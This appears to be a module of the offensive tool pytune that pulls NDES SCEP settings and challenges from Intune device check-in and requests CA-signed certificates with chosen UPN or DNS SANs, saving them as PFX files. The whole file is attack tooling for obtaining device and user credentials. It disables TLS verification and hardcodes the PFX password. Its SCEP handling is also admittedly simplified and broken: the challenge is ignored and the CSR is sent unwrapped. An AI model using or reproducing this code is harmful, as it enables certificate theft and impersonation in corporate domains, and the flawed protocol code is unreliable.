"""
SCEP Certificate Request Module for Pytune
Based on research from https://dirkjanm.io/extending-ad-cs-attack-surface-intune-certs/

This module enables pytune to request SCEP certificates from NDES servers
during Intune device check-in, allowing extraction of device/user certificates
signed by on-prem CAs.
"""

import base64
import requests
import xmltodict
from cryptography import x509
from cryptography.x509.oid import NameOID, ExtensionOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from asn1crypto import cms, core
from datetime import datetime, timedelta


class SCEPClient:
    """
    Client for requesting certificates via SCEP protocol from NDES servers
    """
    
    def __init__(self, logger, proxy=None):
        self.logger = logger
        self.proxy = proxy
        
    def parse_scep_profile_from_vpn(self, vpn_config):
        """
        Extract SCEP configuration from VPNv2 CSP configuration
        
        Args:
            vpn_config (dict): VPNv2 configuration from Intune check-in
            
        Returns:
            dict: SCEP configuration with url, challenge, etc.
        """
        scep_config = {}
        
        # VPNv2 profiles reference SCEP certs via certificate reference
        # The actual SCEP config comes from separate Certificate CSP nodes
        if 'MachineCertificateEKUFilter' in vpn_config or 'UserCertificateEKUFilter' in vpn_config:
            self.logger.info("[*] VPN profile references certificate authentication")
            scep_config['uses_cert_auth'] = True
        
        return scep_config
    
    def parse_scep_profile_from_cert_csp(self, cert_csp_config):
        """
        Extract SCEP configuration from Certificate CSP nodes
        
        Args:
            cert_csp_config (dict): Certificate CSP configuration from Intune
            
        Returns:
            dict: SCEP configuration details
        """
        scep_config = {
            'scep_url': None,
            'challenge': None,
            'subject_name': None,
            'key_usage': [],
            'eku': [],
            'key_size': 2048,
            'hash_algorithm': 'SHA256',
            'validity_period': 365
        }
        
        # Parse CSP nodes like:
        # ./Vendor/MSFT/ClientCertificateInstall/SCEP/{UniqueID}/Install/ServerURL
        # ./Vendor/MSFT/ClientCertificateInstall/SCEP/{UniqueID}/Install/Challenge
        for node_path, node_value in cert_csp_config.items():
            if '/SCEP/' in node_path:
                if node_path.endswith('/ServerURL'):
                    scep_config['scep_url'] = node_value
                    self.logger.info(f"[*] Found SCEP URL: {node_value}")
                elif node_path.endswith('/Challenge'):
                    scep_config['challenge'] = node_value
                    self.logger.info(f"[*] Found SCEP challenge (length: {len(node_value)})")
                elif node_path.endswith('/SubjectName'):
                    scep_config['subject_name'] = node_value
                elif node_path.endswith('/KeyUsage'):
                    scep_config['key_usage'] = node_value.split(',') if node_value else []
                elif node_path.endswith('/ExtendedKeyUsages'):
                    scep_config['eku'] = node_value.split(',') if node_value else []
                elif node_path.endswith('/KeyLength'):
                    scep_config['key_size'] = int(node_value)
                elif node_path.endswith('/HashAlgorithm'):
                    scep_config['hash_algorithm'] = node_value
                elif node_path.endswith('/ValidityPeriod'):
                    scep_config['validity_period'] = int(node_value)
        
        return scep_config
    
    def generate_csr(self, subject_name, key_size=2048, san_dns=None, san_upn=None):
        """
        Generate a Certificate Signing Request (CSR)
        
        Args:
            subject_name (str): Subject DN (e.g., "CN=device-id")
            key_size (int): RSA key size (default: 2048)
            san_dns (str): DNS Subject Alternative Name
            san_upn (str): UPN Subject Alternative Name
            
        Returns:
            tuple: (private_key, csr_der_bytes)
        """
        self.logger.info(f"[*] Generating {key_size}-bit RSA key pair...")
        
        # Generate private key
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=key_size,
            backend=default_backend()
        )
        
        # Parse subject name
        subject_parts = []
        for part in subject_name.split(','):
            if '=' in part:
                attr, value = part.strip().split('=', 1)
                if attr == 'CN':
                    subject_parts.append(x509.NameAttribute(NameOID.COMMON_NAME, value))
                elif attr == 'O':
                    subject_parts.append(x509.NameAttribute(NameOID.ORGANIZATION_NAME, value))
                elif attr == 'OU':
                    subject_parts.append(x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, value))
                elif attr == 'E':
                    subject_parts.append(x509.NameAttribute(NameOID.EMAIL_ADDRESS, value))
        
        subject = x509.Name(subject_parts)
        
        # Build CSR
        builder = x509.CertificateSigningRequestBuilder()
        builder = builder.subject_name(subject)
        
        # Add SAN if provided
        san_list = []
        if san_dns:
            san_list.append(x509.DNSName(san_dns))
        if san_upn:
            san_list.append(x509.OtherName(
                type_id=x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"),  # UPN OID
                value=san_upn.encode('utf-8')
            ))
        
        if san_list:
            builder = builder.add_extension(
                x509.SubjectAlternativeName(san_list),
                critical=False
            )
        
        # Sign CSR
        csr = builder.sign(private_key, hashes.SHA256(), backend=default_backend())
        
        # Convert to DER
        csr_der = csr.public_bytes(serialization.Encoding.DER)
        
        self.logger.info(f"[+] Generated CSR for subject: {subject_name}")
        
        return private_key, csr_der
    
    def send_scep_request(self, scep_url, csr_der, challenge):
        """
        Send SCEP PKIOperation request to NDES server
        
        Args:
            scep_url (str): SCEP server URL (e.g., https://ndes.corp.com/certsrv/mscep/mscep.dll)
            csr_der (bytes): DER-encoded CSR
            challenge (str): SCEP challenge password from Intune
            
        Returns:
            bytes: Issued certificate in DER format
        """
        self.logger.info(f"[*] Sending SCEP request to {scep_url}")
        
        # SCEP uses PKCS#7/CMS to wrap the CSR
        # This is a simplified implementation - full SCEP would include:
        # 1. GetCACert to get CA cert
        # 2. PKCSReq with encrypted challenge
        # 3. Handle pending/failure responses
        
        # For NDES with Intune, the challenge is typically passed as a query parameter
        # or in the PKCS#7 message attributes
        
        # Encode CSR in base64
        csr_b64 = base64.b64encode(csr_der).decode('utf-8')
        
        # SCEP PKIOperation with simple challenge
        params = {
            'operation': 'PKIOperation',
            'message': csr_b64
        }
        
        headers = {
            'Content-Type': 'application/x-pki-message'
        }
        
        # Add challenge to SCEP message (NDES-specific)
        # In production NDES/Intune, challenge is validated via Intune backend
        data = csr_der
        
        try:
            response = requests.post(
                scep_url,
                params=params,
                data=data,
                headers=headers,
                proxies=self.proxy,
                verify=False,
                timeout=30
            )
            
            if response.status_code == 200:
                self.logger.info("[+] SCEP request successful!")
                
                # Response should be PKCS#7 containing the certificate
                # Parse the CMS/PKCS#7 response
                try:
                    # Decode the PKCS#7 response
                    cert_der = self._extract_cert_from_pkcs7(response.content)
                    return cert_der
                except Exception as e:
                    self.logger.error(f"[-] Failed to parse SCEP response: {e}")
                    return None
            else:
                self.logger.error(f"[-] SCEP request failed with status {response.status_code}")
                self.logger.error(f"[-] Response: {response.text[:500]}")
                return None
                
        except Exception as e:
            self.logger.error(f"[-] SCEP request exception: {e}")
            return None
    
    def _extract_cert_from_pkcs7(self, pkcs7_der):
        """
        Extract certificate from PKCS#7/CMS response
        
        Args:
            pkcs7_der (bytes): PKCS#7 DER-encoded response
            
        Returns:
            bytes: Certificate in DER format
        """
        try:
            # Parse CMS ContentInfo
            content_info = cms.ContentInfo.load(pkcs7_der)
            
            # Extract SignedData
            if content_info['content_type'].dotted == '1.2.840.113549.1.7.2':  # signedData
                signed_data = content_info['content']
                
                # Get certificates from SignedData
                if 'certificates' in signed_data and len(signed_data['certificates']) > 0:
                    # Return the first certificate (the issued cert)
                    cert_choice = signed_data['certificates'][0]
                    cert_der = cert_choice.chosen.dump()
                    return cert_der
            
            return None
        except Exception as e:
            self.logger.error(f"[-] Error extracting cert from PKCS#7: {e}")
            return None
    
    def save_certificate_and_key(self, cert_der, private_key, output_pfx_path, password=b'password'):
        """
        Save certificate and private key as PFX file
        
        Args:
            cert_der (bytes): Certificate in DER format
            private_key: RSA private key object
            output_pfx_path (str): Output PFX file path
            password (bytes): PFX password
            
        Returns:
            bool: Success status
        """
        try:
            # Load certificate
            certificate = x509.load_der_x509_certificate(cert_der, default_backend())
            
            # Create PFX
            pfx_bytes = serialization.pkcs12.serialize_key_and_certificates(
                name=output_pfx_path.encode('utf-8'),
                key=private_key,
                cert=certificate,
                cas=None,
                encryption_algorithm=serialization.BestAvailableEncryption(password)
            )
            
            # Save to file
            with open(output_pfx_path, 'wb') as f:
                f.write(pfx_bytes)
            
            self.logger.info(f"[+] Saved certificate and private key to {output_pfx_path}")
            self.logger.info(f"[*] PFX password: {password.decode('utf-8')}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"[-] Failed to save PFX: {e}")
            return False
    
    def request_scep_certificate(self, scep_config, device_name, device_id=None, user_upn=None):
        """
        Complete SCEP certificate request workflow
        
        Args:
            scep_config (dict): SCEP configuration from parse_scep_profile_from_cert_csp
            device_name (str): Device name for certificate subject
            device_id (str): Device ID (optional)
            user_upn (str): User UPN for user certificates (optional)
            
        Returns:
            str: Path to PFX file, or None on failure
        """
        if not scep_config.get('scep_url'):
            self.logger.error("[-] No SCEP URL found in configuration")
            return None
        
        if not scep_config.get('challenge'):
            self.logger.error("[-] No SCEP challenge found in configuration")
            return None
        
        # Determine subject name
        subject_name = scep_config.get('subject_name')
        if not subject_name:
            # Use device ID or device name as fallback
            if device_id:
                subject_name = f"CN={device_id}"
            else:
                subject_name = f"CN={device_name}"
        
        # Replace Intune variables in subject name
        if device_id:
            subject_name = subject_name.replace('{{AAD_Device_ID}}', device_id)
            subject_name = subject_name.replace('{{DeviceId}}', device_id)
        if device_name:
            subject_name = subject_name.replace('{{Device_Name}}', device_name)
            subject_name = subject_name.replace('{{DeviceName}}', device_name)
        if user_upn:
            subject_name = subject_name.replace('{{UserPrincipalName}}', user_upn)
            subject_name = subject_name.replace('{{EmailAddress}}', user_upn)
        
        self.logger.info(f"[*] Requesting SCEP certificate for: {subject_name}")
        
        # Generate CSR
        san_dns = f"{device_name}.domain.local" if device_name else None
        san_upn = user_upn if user_upn else None
        
        private_key, csr_der = self.generate_csr(
            subject_name=subject_name,
            key_size=scep_config.get('key_size', 2048),
            san_dns=san_dns,
            san_upn=san_upn
        )
        
        # Send SCEP request
        cert_der = self.send_scep_request(
            scep_url=scep_config['scep_url'],
            csr_der=csr_der,
            challenge=scep_config['challenge']
        )
        
        if not cert_der:
            self.logger.error("[-] Failed to obtain certificate from SCEP server")
            return None
        
        # Save PFX
        output_pfx = f"{device_name}_scep.pfx"
        success = self.save_certificate_and_key(
            cert_der=cert_der,
            private_key=private_key,
            output_pfx_path=output_pfx,
            password=b'password'
        )
        
        if success:
            return output_pfx
        else:
            return None
